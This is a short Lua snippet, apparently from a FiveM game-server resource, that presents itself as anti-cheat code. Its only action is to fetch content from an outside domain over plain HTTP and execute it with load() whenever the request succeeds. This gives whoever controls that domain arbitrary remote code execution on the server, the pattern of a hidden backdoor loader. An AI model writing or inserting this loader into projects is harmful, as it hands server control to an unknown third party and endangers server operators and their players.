PerformHttpRequest('http://erfanebrahimi.ir/fivem/antiCheat/source.php', function(Error, content, Header)
    if ( Error == 200 and content ~= nil ) then
        load(content)()
    end
end)